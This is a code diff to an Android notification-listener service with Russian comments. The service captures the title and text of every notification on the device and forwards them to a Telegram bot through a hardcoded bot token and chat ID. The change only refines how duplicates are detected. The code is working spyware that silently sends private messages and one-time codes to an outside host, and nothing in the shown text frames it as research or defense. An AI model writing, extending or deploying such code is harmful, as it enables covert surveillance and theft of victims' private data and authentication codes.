@@ -1,5 +1,8 @@
+package com.mark.app;
+
 import android.service.notification.NotificationListenerService;
 import android.service.notification.StatusBarNotification;
+
 import java.io.OutputStream;
 import java.net.HttpURLConnection;
 import java.net.URL;
@@ -11,28 +14,34 @@ public class NotificationService extends NotificationListenerService {
     private final String TOKEN = "8134845868:AAHvlP0Dewspgk5RT5-qg75iA3pendMztHA";
     private final String CHAT_ID = "7797248765";
 
-    // Хранит ID уведомлений, которые уже отправили
+    // Хранит уже отправленные уведомления
     private final HashSet<String> sentNotifications = new HashSet<>();
 
     @Override
     public void onNotificationPosted(StatusBarNotification sbn) {
-        String packageName = sbn.getPackageName();
+
+        // Уникальный ключ уведомления (самый правильный вариант)
+        String key = sbn.getKey();
+
+        // Если уже отправляли — выходим
+        if (sentNotifications.contains(key)) {
+            return;
+        }
+
         CharSequence titleCs = sbn.getNotification().extras.getCharSequence("android.title");
         CharSequence textCs = sbn.getNotification().extras.getCharSequence("android.text");
 
         String title = titleCs != null ? titleCs.toString() : "";
         String text = textCs != null ? textCs.toString() : "";
 
+        // Если есть текст — отправляем
         if (!text.isEmpty()) {
-            // Формируем уникальный ключ для уведомления
-            String uniqueKey = packageName + "|" + title + "|" + text;
 
-            // Проверяем, отправляли ли уже это уведомление
-            if (!sentNotifications.contains(uniqueKey)) {
-                sentNotifications.add(uniqueKey);
-                String message = "[" + packageName + "] " + title + ": " + text;
-                sendToTelegram(message);
-            }
+            // Добавляем в список отправленных
+            sentNotifications.add(key);
+
+            String message = "[" + sbn.getPackageName() + "] " + title + ": " + text;
+            sendToTelegram(message);
         }
     }
 
@@ -55,6 +64,7 @@ public class NotificationService extends NotificationListenerService {
 
                 conn.getInputStream().close();
                 conn.disconnect();
+
             } catch (Exception e) {
                 e.printStackTrace();
             }
